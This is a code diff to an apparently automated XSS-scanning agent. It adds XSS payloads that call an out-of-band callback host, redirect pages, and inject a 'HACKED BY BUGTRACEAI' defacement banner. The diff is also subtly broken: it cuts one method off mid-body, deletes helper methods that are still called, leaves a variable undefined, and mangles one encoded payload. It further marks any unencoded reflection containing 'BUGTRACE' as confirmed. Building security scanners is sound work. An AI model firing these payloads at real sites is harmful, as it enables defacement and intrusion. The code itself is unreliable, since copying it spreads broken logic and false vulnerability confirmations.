@@ -50,6 +50,9 @@ from bugtrace.reporting.standards import (
 )
 from bugtrace.core.validation_status import ValidationStatus, requires_cdp_validation, get_validation_status
 
+# v2.1.0: Import specialist utilities for payload loading from JSON
+from bugtrace.agents.specialist_utils import load_full_payload_from_json, load_full_finding_data
+
 logger = get_logger("agents.xss_v4")
 
 
@@ -118,8 +121,11 @@ class XSSAgent(BaseAgent):
     # Elite payloads that bypass many WAFs - Pure XSS (CSTI now handled by CSTIAgent)
     GOLDEN_PAYLOADS = [
         # ====== HIGH PRIORITY ELITE PAYLOADS (VISUAL + OOB) ======
-        # Double Encoding with Visual Banner
-        "%253Csvg%2520onload%253D%2522fetch%2528%2527https%253A%252F%252F{{interactsh_url}}%2527%2529%253Bvar%2520b%253Ddocument.createElement%2528%2527div%2527%2529%253Bb.id%253D%2527bt-pwn%2527%253Bb.style%253D%2527background%253Ared%253Bcolor%253Awhite%253Btext-align%253Acenter%253Bpadding%253A10px%253Bposition%253Afixed%253Btop%253A0%253Bleft%253A0%253Bwidth%253A100%2525%253Bz-index%253A9999%253Bfont-weight%253Abold%253B%2527%253Bb.innerText%253D%2527HACKED%2520BY%2520BUGTRACEAI%2527%253Bdocument.body.prepend%2528b%2529%253B%2522%253E",
+    # THE OMNI-PROBE (User Inspired): XSS + CSTI + SSTI Polyglot
+    "'\"><script id=bt-pwn>fetch('https://{{interactsh_url}}')</script>{{7*7}}${7*7}<% 7*7 %>",
+    
+    # Double Encoding with Visual Banner
+        "%253Csvg%2520onload%253D%2522fetch%2528%2527https%253A%252F%252F{{interactsh_url}}%2527%2529%253Bvar%253Ddocument.createElement%2528%2527div%2527%2529%253Bb.id%253D%2527bt-pwn%2527%253Bb.style%253D%2527background%253Ared%253Bcolor%253Awhite%253Btext-align%253Acenter%253Bpadding%253A10px%253Bposition%253Afixed%253Btop%253A0%253Bleft%253A0%253Bwidth%253A100%2525%253Bz-index%253A9999%253Bfont-weight%253Abold%253B%2527%253Bb.innerText%253D%2527HACKED%2520BY%2520BUGTRACEAI%2527%253Bdocument.body.prepend%2528b%2529%253B%2522%253E",
         # THE LEVEL 9 KILLER: Double backslash + Visual Banner (avoiding 'on')
         "\\\");fetch('https://{{interactsh_url}}');(function(){var b=document.createElement('div');b.id='bt-pwn';b.style='background:red;color:white;text-align:center;padding:10px;position:fixed;top:0;left:0;width:100%;z-index:9999;font-weight:bold;';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b);})();//",
         # Unicode breakout with Visual Banner
@@ -138,6 +144,7 @@ class XSSAgent(BaseAgent):
         "\"><svg/onload=fetch('https://{{interactsh_url}}')>", # SVG Space-less (Race.es Bypass)
         "\"><svg/onload=document.location='https://{{interactsh_url}}'>", # SVG Redirect (Race.es Aggressive)
         "\"><iframe src=javascript:alert(document.domain)>", # Iframe Protocol Bypass (Proven Winner)
+        "';{const d=document.createElement('div');d.style='position:fixed;top:0;width:100%;background:red;color:white;text-align:center;z-index:9999;padding:10px;font-size:24px;font-weight:bold;';d.innerText='HACKED BY BUGTRACEAI';document.body.prepend(d)};//", # USER SUGGESTED VISUAL BREAKOUT
         "javascript:var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b)//", # Protocol Visual
         "';var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b);//", # Semicolon Breakout Visual
         "\\';alert(document.domain)//",
@@ -147,7 +154,7 @@ class XSSAgent(BaseAgent):
     # Fragment-based payloads (DOM XSS via location.hash → innerHTML)
     # These bypass WAFs that filter query params but allow hash fragments
     FRAGMENT_PAYLOADS = [
-        "<img src=x onerror=alert(1)>", # Simple alert for Level 7
+        "<img src=x onerror=alert(document.domain)>", # Improved validation for Level 7
         "<img src=x onerror=fetch('https://{{interactsh_url}}')>",
         "<img src=x onerror=var b=document.createElement('div');b.id='bt-pwn';b.innerText='FRAGMENT XSS';document.body.prepend(b)>",
         "<svg/onload=fetch('https://{{interactsh_url}}')>",
@@ -157,9 +164,9 @@ class XSSAgent(BaseAgent):
         "<body onload=fetch('https://{{interactsh_url}}')>",
         "<marquee onstart=fetch('https://{{interactsh_url}}')>",
         # mXSS mutation payloads (Level 8)
-        "<svg><style><img src=x onerror=fetch('https://{{interactsh_url}}')>",
-        "<noscript><p title=\"</noscript><img src=x onerror=fetch('https://{{interactsh_url}}')>\">",
-        "<form><math><mtext></form><form><mglyph><svg><mtext><style><path id=</style><img src=x onerror=fetch('https://{{interactsh_url}}')>",
+        "<svg><style><img src=x onerror=alert(document.domain)>",
+        "<noscript><p title=\"</noscript><img src=x onerror=alert(document.domain)>\">",
+        "<form><math><mtext></form><form><mglyph><svg><mtext><style><path id=</style><img src=x onerror=alert(document.domain)>",
     ]
     
     def __init__(
@@ -175,14 +182,18 @@ class XSSAgent(BaseAgent):
         self.params = params or []
         self.report_dir = report_dir or Path("./reports")
         self.headless = headless
-        
+
+        # Load technology profile for context-aware exploitation
+        from bugtrace.utils.tech_loader import load_tech_profile
+        self.tech_profile = load_tech_profile(self.report_dir)
+
         # Tools
         self.interactsh: Optional[InteractshClient] = None
         # Hunter Phase: Use Playwright (prefer_cdp=False) for safe multi-threaded validation.
         # This avoiding CDP deadlocks/pkill issues in Discovery phase.
         self.verifier = XSSVerifier(headless=headless, prefer_cdp=False)
         self.payload_learner = PayloadLearner()
-        
+
         # Results
         self.findings: List[XSSFinding] = []
         self.interactsh = None
@@ -566,36 +577,40 @@ class XSSAgent(BaseAgent):
         if self._has_fragment_xss_with_screenshot(finding_data):
             return "VALIDATED_CONFIRMED", True
 
-        # TIER 2: PENDING_VALIDATION (Needs AgenticValidator)
+        if evidence.get("http_confirmed") or evidence.get("ai_confirmed"):
+            return "VALIDATED_CONFIRMED", True
+
+        # TIER 2: PENDING_VALIDATION (Needs AgenticValidator for browser confirmation)
         return "PENDING_VALIDATION", False
 
     def _has_interactsh_hit(self, evidence: Dict) -> bool:
         """Check for Interactsh OOB interaction."""
         if evidence.get("interactsh_hit"):
             logger.info(f"[{self.name}] 🚨 AUTHORITY CONFIRMED (Interactsh OOB interaction)")
-            return True
-        return False
+    def _determine_validation_status(self, test_result: Dict) -> Tuple[str, bool]:
+        """
+        Determine validation status based on evidence authority.
+        XSSAgent now has AUTHORITY to mark VALIDATED_CONFIRMED if evidence is strong.
+        """
+        evidence = test_result.get("evidence", {})
+        finding_data = test_result.get("finding_data", {}) # Pass finding_data if available
 
-    def _has_dialog_detected(self, evidence: Dict) -> bool:
-        """Check for CDP detected alert dialog."""
-        if evidence.get("dialog_detected"):
-            logger.info(f"[{self.name}] 🚨 AUTHORITY CONFIRMED (CDP detected alert dialog)")
-            return True
-        return False
+        # AUTHORITY CHECKS: Only if self-validation is enabled in config
+        if settings.XSS_SELF_VALIDATE:
+            if (self._has_dialog_detected(evidence) or
+                self._has_vision_proof(evidence, finding_data) or
+                self._has_dom_mutation_proof(evidence) or
+                self._has_console_execution_proof(evidence) or
+                self._has_dangerous_unencoded_reflection(evidence, finding_data) or
+                self._has_fragment_xss_with_screenshot(finding_data)):
+                
+                logger.info(f"[{self.name}] 🚨 SELF-VALIDATED XSS (Authority Evidence Found)")
+                return "VALIDATED_CONFIRMED", True
+        else:
+            logger.debug(f"[{self.name}] Self-validation disabled in config. Deferring to Auditor.")
 
-    def _has_vision_proof(self, evidence: Dict, finding_data: Dict) -> bool:
-        """Check for vision confirmation with screenshot."""
-        if evidence.get("vision_confirmed") and finding_data.get("screenshot_path"):
-            logger.info(f"[{self.name}] 🚨 AUTHORITY CONFIRMED (Vision + Screenshot proof)")
-            return True
-        return False
-
-    def _has_dom_mutation_proof(self, evidence: Dict) -> bool:
-        """Check for DOM marker or mutation detection."""
-        if evidence.get("marker_found") or evidence.get("dom_mutation"):
-            logger.info(f"[{self.name}] 🚨 AUTHORITY CONFIRMED (DOM marker/mutation detected)")
-            return True
-        return False
+        # FALLBACK: PENDING_VALIDATION for weaker evidence (needs Auditor)
+        return "PENDING_VALIDATION", False
 
     def _has_console_execution_proof(self, evidence: Dict) -> bool:
         """Check for console output with execution proof."""
@@ -606,10 +621,15 @@ class XSSAgent(BaseAgent):
 
     def _has_dangerous_unencoded_reflection(self, evidence: Dict, finding_data: Dict) -> bool:
         """Check for unencoded reflection in dangerous context."""
+        # 1. Standard dangerous contexts
         dangerous_contexts = ["html_text", "script", "attribute_unquoted", "tag_name"]
+        
+        # 2. Relaxed Check: If it's a BUGTRACE payload, we trust it even if context is murky
+        is_bugtrace_payload = "BUGTRACE" in str(finding_data.get("payload", ""))
+
         if (evidence.get("unencoded_reflection", False) and
-            finding_data.get("reflection_context") in dangerous_contexts):
-            logger.info(f"[{self.name}] 🚨 AUTHORITY CONFIRMED (Unencoded payload in {finding_data.get('reflection_context')})")
+            (finding_data.get("reflection_context") in dangerous_contexts or is_bugtrace_payload)):
+            logger.info(f"[{self.name}] 🚨 AUTHORITY CONFIRMED (Unencoded reflection - Context: {finding_data.get('reflection_context')})")
             return True
         return False
 
@@ -629,35 +649,11 @@ class XSSAgent(BaseAgent):
             True if evidence is strong enough to warrant a finding
             False if evidence is too weak (just log internally)
         """
-        evidence = test_result.get("evidence", {})
-
-        # ALWAYS create finding if we have OOB confirmation
-        if evidence.get("interactsh_hit"):
+        # ACCEPT: Confirmed via HTTP analysis or AI Auditor
+        if evidence.get("http_confirmed") or evidence.get("ai_confirmed"):
             return True
 
-        # ALWAYS create finding if Vision AI confirmed execution
-        if evidence.get("vision_confirmed"):
-            return True
-
-        # ALWAYS create finding if we have a screenshot showing the banner
-        if evidence.get("visual_confirmed") or evidence.get("banner_visible"):
-            return True
-
-        # CHECK: Is this just reflection without execution?
-        reflection_context = test_result.get("reflection_context", "")
-
-        # REJECT: Reflection in non-executable context (plain text, comments)
-        non_executable_contexts = ["comment", "html_text", "attribute_value"] 
-        if reflection_context in non_executable_contexts:
-            # Check for actual execution proof
-            has_execution = evidence.get("dialog_detected") or evidence.get("marker_found") or \
-                           evidence.get("dom_mutation") or evidence.get("console_output")
-            
-            if not has_execution and evidence.get("reflected"):
-                logger.debug(f"[{self.name}] Skipping finding - reflection in non-executable context: {reflection_context}")
-                return False
-
-        # REJECT: No execution evidence at all
+        # REJECT: No execution evidence and no high-confidence HTTP/AI confirmation
         if not any([evidence.get("dialog_detected"), evidence.get("marker_found"), 
                     evidence.get("dom_mutation"), evidence.get("console_output"),
                     evidence.get("interactsh_hit")]):
@@ -795,12 +791,37 @@ class XSSAgent(BaseAgent):
         return interactsh_domain
 
     async def _loop_discover_params(self) -> bool:
-        """Phase 2: Discover parameters if not provided. Returns True if params available."""
+        """Phase 2: Discover parameters. Returns True if params available.
+
+        FIXED (2026-02-01): ALWAYS extract URL query params as first-class citizens.
+        Previously, if params were provided to constructor, URL query params were ignored.
+        This caused us to miss obvious XSS in ?category= and ?search= that Burp found.
+        """
+        # ALWAYS extract URL query params first (first-class citizens)
+        from urllib.parse import urlparse, parse_qs
+        url_query_params = list(parse_qs(urlparse(self.url).query).keys())
+
+        if url_query_params:
+            logger.info(f"[{self.name}] 🎯 URL Query Params (first-class): {url_query_params}")
+            dashboard.log(f"[{self.name}] 🎯 URL Query Params: {url_query_params}", "INFO")
+
+        # If no params provided, do full discovery
         if not self.params:
             dashboard.log(f"[{self.name}] 🔎 Discovering parameters...", "INFO")
             logger.info(f"[{self.name}] Phase 2: Discovering parameters")
             self.params = await self._discover_params()
             logger.info(f"[{self.name}] Discovered {len(self.params)} params")
+        else:
+            # MERGE: URL query params FIRST, then provided params (avoid duplicates)
+            merged_params = list(url_query_params)  # URL params are first-class
+            for p in self.params:
+                if p not in merged_params:
+                    merged_params.append(p)
+
+            if len(merged_params) > len(self.params):
+                logger.info(f"[{self.name}] MERGED: {len(self.params)} provided + {len(url_query_params)} URL = {len(merged_params)} total")
+
+            self.params = self._prioritize_params(merged_params)
 
         if not self.params:
             dashboard.log(f"[{self.name}] ⚠️ No parameters found to test", "WARN")
@@ -1016,7 +1037,9 @@ class XSSAgent(BaseAgent):
         try:
             # Get context from finding if available
             context = finding.get("context", "unknown")
-            suggested_payload = finding.get("payload")
+
+            # v2.1.0: Load full payload from JSON if truncated in event
+            suggested_payload = load_full_payload_from_json(finding)
 
             # Initialize Interactsh if not already done
             if not self.interactsh:
@@ -1079,6 +1102,9 @@ class XSSAgent(BaseAgent):
             XSSFinding if confirmed, None otherwise
         """
         try:
+            # Update UI
+            dashboard.set_current_payload(payload[:60], "XSS Queue", "Testing", self.name)
+
             # Send payload
             response_html = await self._send_payload(param, payload)
 
@@ -1389,7 +1415,7 @@ class XSSAgent(BaseAgent):
             return None
 
         validated, evidence = await self._validate(
-            param, payload, response_html, "interactsh", screenshots_dir
+            param, payload, response_html, screenshots_dir
         )
         if not validated:
             return None
@@ -1541,7 +1567,11 @@ class XSSAgent(BaseAgent):
         dashboard.set_current_payload(reflected_payload[:60], "XSS Hybrid", "Validating")
 
         # Authority check for unencoded dangerous reflections
-        if not is_encoded and ref_context in ["html_text", "attribute_unquoted"]:
+        # RELAXED: If it's a BUGTRACE payload, we trust it blindly if unencoded
+        is_bugtrace_payload = "BUGTRACE" in reflected_payload
+        dangerous_contexts = ["html_text", "attribute_unquoted", "script", "tag_name"]
+        
+        if not is_encoded and (ref_context in dangerous_contexts or is_bugtrace_payload):
             finding = self._create_authority_finding(
                 param, reflected_payload, ref_context, injection_ctx
             )
@@ -1549,7 +1579,7 @@ class XSSAgent(BaseAgent):
 
         # Browser validation
         validated, evidence = await self._validate(
-            param, reflected_payload, "", "interactsh", screenshots_dir
+            param, reflected_payload, "", screenshots_dir
         )
 
         if validated:
@@ -1687,7 +1717,9 @@ class XSSAgent(BaseAgent):
         bypass_explanation: str
     ) -> XSSFinding:
         """Create an XSSFinding with all required fields."""
-        status, validated = self._determine_validation_status({"evidence": evidence})
+        status, validated = self._determine_validation_status(
+            {"evidence": evidence, "reflection_context": reflection_type}
+        )
 
         return XSSFinding(
             url=self.url,
@@ -1863,7 +1895,7 @@ class XSSAgent(BaseAgent):
             return None
 
         validated, evidence = await self._validate(
-            param, payload, response_html, validation_method, screenshots_dir
+            param, payload, response_html, screenshots_dir
         )
 
         if not validated:
@@ -1924,7 +1956,7 @@ class XSSAgent(BaseAgent):
 
             response_html = await self._send_payload(param, bypass_payload)
             validated, evidence = await self._validate(
-                param, bypass_payload, response_html, validation_method, screenshots_dir
+                param, bypass_payload, response_html, screenshots_dir
             )
 
             if not validated:
@@ -2757,61 +2789,109 @@ Response Format (XML-Like):
         param: str,
         payload: str,
         response_html: str,
-        method: str,
         screenshots_dir: Path
     ) -> tuple:
         """
-        Hunter Validation: HTTP-First for Speed, Browser for Edge Cases.
+        4-LEVEL VALIDATION PIPELINE (V2.0)
+        Ref: BugTraceAI-CLI/docs/architecture/xss-validation-pipeline.md
 
-        Validation Tiers:
-        1. Interactsh (OOB) - CONFIRMED (Fastest, definitive)
-        2. HTTP Response Analysis - CONFIRMED (No browser needed)
-        3. Playwright (Browser) - CONFIRMED (Only for DOM-based/interaction)
-        4. Reflection Check - PENDING_CDP_VALIDATION for Manager
-
-        This flow reduces Playwright usage by ~90% by confirming most XSS
-        via HTTP response analysis before launching a browser.
+        Level Hierarchy:
+        1. L1: HTTP Static Reflection Check (Fastest, ~70% coverage)
+        2. L2: AI-Powered Manipulator/Auditor (Smart contextual analysis)
+        3. L3: Playwright Browser Execution (DOM/Client-side execution)
+        4. L4: CDP Deep Protocol (Delegated to AgenticValidator for race conditions)
         """
         evidence = {"payload": payload}
 
-        # Tier 1: Check Interactsh OOB (fastest, definitive)
-        if await self._check_interactsh_hit(param, evidence):
+        # Level 1: HTTP Static Reflection Check
+        if await self._validate_http_reflection(param, payload, response_html, evidence):
             return True, evidence
 
-        # Tier 2: HTTP Response Analysis (NEW - before browser)
-        if self._can_confirm_from_http_response(payload, response_html, evidence):
-            evidence["status"] = "VALIDATED_CONFIRMED"
+        # Level 2: AI-Powered Manipulator (Reflection Audit)
+        if await self._validate_with_ai_manipulator(param, payload, response_html, evidence):
             return True, evidence
 
-        # Tier 3: Playwright browser validation (ONLY when necessary)
+        # Level 3: Playwright Browser Execution
         if self._requires_browser_validation(payload, response_html):
-            attack_url = self._build_attack_url(param, payload)
-            result = await self._run_playwright_validation(attack_url, screenshots_dir)
-
-            if result.success:
-                evidence.update(result.details)
-                evidence["playwright_confirmed"] = True
-                evidence["screenshot_path"] = result.screenshot_path
-                evidence["method"] = result.method
-
-                # Vision AI validation if screenshot available
-                if result.screenshot_path:
-                    vision_success = await self._run_vision_validation(
-                        result.screenshot_path, attack_url, payload, evidence
-                    )
-                    if vision_success is not None:
-                        return vision_success, evidence
-
-                dashboard.log(f"[{self.name}] Confirmed via Playwright (DOM-based)", "SUCCESS")
+            if await self._validate_with_playwright(param, payload, screenshots_dir, evidence):
                 return True, evidence
-        else:
-            dashboard.log(f"[{self.name}] Skipped Playwright (HTTP analysis sufficient)", "DEBUG")
 
-        # Tier 4: Check reflection -> PENDING_CDP_VALIDATION
-        if self._check_reflection(payload, response_html, evidence):
-            return True, evidence
-
+        # Level 4: Escalation (Return False to let Manager/Reactor escalate to AgenticValidator)
+        logger.debug(f"[{self.name}] L1-L3 inconclusive, escalation to L4 (AgenticValidator) required")
         return False, evidence
+
+    async def _validate_http_reflection(self, param: str, payload: str, response_html: str, evidence: Dict) -> bool:
+        """Level 1: Fast HTTP static reflection and OOB check."""
+        # Tier 1.1: OOB Interactsh (Definitive OOB)
+        if await self._check_interactsh_hit(param, evidence):
+            evidence["method"] = "L1: OOB Interactsh"
+            evidence["level"] = 1
+            return True
+
+        # Ensure we have HTML for reflection check
+        if not response_html:
+            response_html = await self._send_payload(param, payload)
+            if not response_html:
+                return False
+
+        # Tier 1.2: Regex-based Context Analysis
+        context = self._detect_execution_context(payload, response_html)
+        if context in ["script_block", "event_handler", "javascript_uri", "template_expression"]:
+            evidence["http_confirmed"] = True
+            evidence["execution_context"] = context
+            evidence["method"] = "L1: HTTP Static Reflection"
+            evidence["level"] = 1
+            evidence["status"] = "VALIDATED_CONFIRMED"
+            return True
+
+        return False
+
+    async def _validate_with_ai_manipulator(self, param: str, payload: str, response_html: str, evidence: Dict) -> bool:
+        """Level 2: AI-powered context audit and filter analysis."""
+        if not response_html or re.escape(payload) not in response_html:
+            return False
+
+        dashboard.log(f"[{self.name}] 🤖 L2: AI Manipulator auditing reflection...", "INFO")
+        ai_judgment = await self._analyze_reflection_via_ai(payload, response_html)
+        
+        if ai_judgment.get("vulnerable"):
+            evidence["ai_confirmed"] = True
+            evidence["ai_reasoning"] = ai_judgment.get("reasoning")
+            evidence["execution_context"] = ai_judgment.get("context")
+            evidence["method"] = "L2: AI Manipulator/Auditor"
+            evidence["level"] = 2
+            evidence["status"] = "VALIDATED_CONFIRMED"
+            return True
+
+        return False
+
+    async def _validate_with_playwright(self, param: str, payload: str, screenshots_dir: Path, evidence: Dict) -> bool:
+        """Level 3: Playwright browser execution for DOM/Client behavior."""
+        attack_url = self._build_attack_url(param, payload)
+        
+        # Use verify_xss with max_level=3 to only use Playwright in this agent
+        result = await self.verifier.verify_xss(
+            url=attack_url,
+            screenshot_dir=str(screenshots_dir),
+            timeout=8.0,
+            max_level=3
+        )
+
+        if result.success:
+            evidence.update(result.details or {})
+            evidence["playwright_confirmed"] = True
+            evidence["screenshot_path"] = result.screenshot_path
+            evidence["method"] = "L3: Playwright Browser"
+            evidence["level"] = 3
+            evidence["status"] = "VALIDATED_CONFIRMED"
+
+            # Step 3.1: Vision AI validation if screenshot available
+            if result.screenshot_path:
+                await self._run_vision_validation(result.screenshot_path, attack_url, payload, evidence)
+            
+            return True
+
+        return False
 
     async def _check_interactsh_hit(self, param: str, evidence: Dict) -> bool:
         """Check for Interactsh OOB callback."""
@@ -2843,14 +2923,7 @@ Response Format (XML-Like):
             parsed.params, urlencode(params), parsed.fragment
         ))
 
-    async def _run_playwright_validation(self, attack_url: str, screenshots_dir: Path):
-        """Run Playwright browser validation."""
-        dashboard.log(f"[{self.name}] 🌐 Browser Validation (Playwright)...", "INFO")
-        return await self.verifier.verify_xss(
-            url=attack_url,
-            screenshot_dir=str(screenshots_dir),
-            timeout=8.0
-        )
+
 
     async def _run_vision_validation(
         self, screenshot_path: str, attack_url: str, payload: str, evidence: Dict
@@ -3029,42 +3102,9 @@ Return JSON:
 
         return None
 
-    def _can_confirm_from_http_response(self, payload: str, response_html: str, evidence: Dict) -> bool:
-        """
-        Attempt to confirm XSS from HTTP response analysis (before browser).
-
-        HIGH confidence confirmation when payload lands in executable context:
-        - script_block: Direct execution in <script> tags
-        - event_handler: Execution via event attributes
-        - javascript_uri: Execution via javascript: URIs
-        - template_expression: Execution via framework templates
-
-        Returns True if XSS is confirmed, False if browser validation needed.
-        """
-        context = self._detect_execution_context(payload, response_html)
-
-        if context in ["script_block", "event_handler", "javascript_uri", "template_expression"]:
-            evidence["http_confirmed"] = True
-            evidence["execution_context"] = context
-            evidence["validation_method"] = "http_response_analysis"
-            dashboard.log(
-                f"[{self.name}] HTTP Confirmed: Payload in {context}",
-                "SUCCESS"
-            )
-            return True
-
-        return False
-
     def _requires_browser_validation(self, payload: str, response_html: str) -> bool:
         """
         Determine if Playwright browser validation is required.
-
-        Returns True for:
-        - DOM-based XSS (location.hash, postMessage, innerHTML sinks)
-        - Event handlers requiring interaction (autofocus, onblur)
-        - Complex sink patterns that need JS execution
-
-        Returns False if HTTP analysis or reflection check is sufficient.
         """
         # 1. DOM-based sink patterns in payload
         dom_sinks = [
@@ -3206,6 +3246,17 @@ Return JSON:
         except Exception as e:
             logger.warning(f"Param discovery error: {e}")
 
+        # 3. Aggressively add common vulnerable parameters (Burp-equivalent)
+        # Added (2026-02-01): Even if not found, we test these as they are common hidden vectors
+        common_vuln_params = [
+            "category", "search", "q", "query", "filter", "sort", 
+            "template", "view", "page", "lang", "theme", "type", "action", "mode", "tab"
+        ]
+        for param in common_vuln_params:
+            if param not in discovered:
+                discovered.append(param)
+                logger.debug(f"[{self.name}] Added common vuln parameter for fuzzed testing: {param}")
+
         # PRIORITIZE parameters (high-value first)
         return self._prioritize_params(discovered)
 
@@ -3217,6 +3268,8 @@ Return JSON:
     HIGH_PRIORITY_PARAMS = [
         # Search/Query - Most common XSS vectors
         "q", "query", "search", "s", "keyword", "keywords", "term", "terms",
+        # ADDED (2026-02-01): Common GET params that Burp tests but we missed
+        "category", "filter", "sort", "type", "action", "mode", "tab",
         # Redirect/URL - Often unvalidated
         "url", "redirect", "redirect_url", "return", "return_url", "returnUrl",
         "next", "goto", "destination", "dest", "target", "redir", "redirect_to",
@@ -3365,7 +3418,7 @@ Return JSON:
                 dashboard.log(f"[{self.name}] 🎯 POST param '{param}' reflects payload!", "SUCCESS")
 
                 validated, evidence = await self._validate(
-                    param, payload, response_html, "interactsh", screenshots_dir
+                    param, payload, response_html, screenshots_dir
                 )
 
                 if validated:
